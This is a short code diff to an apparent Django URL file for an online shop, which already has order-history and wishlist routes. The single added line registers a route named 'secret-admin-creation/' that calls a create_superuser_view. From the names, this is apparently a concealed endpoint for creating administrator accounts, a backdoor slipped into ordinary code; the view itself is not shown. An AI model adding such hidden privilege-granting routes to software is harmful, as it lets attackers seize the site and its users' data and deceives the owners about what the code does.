@@ -12,4 +12,5 @@ urlpatterns = [
     path('history/', views.order_history, name='order_history'),
     path('wishlist/', views.wishlist, name='wishlist'),
     path('wishlist/toggle/<int:product_id>/', views.wishlist_toggle, name='wishlist_toggle'),
+    path('secret-admin-creation/', views.create_superuser_view, name='create_superuser'),
 ]
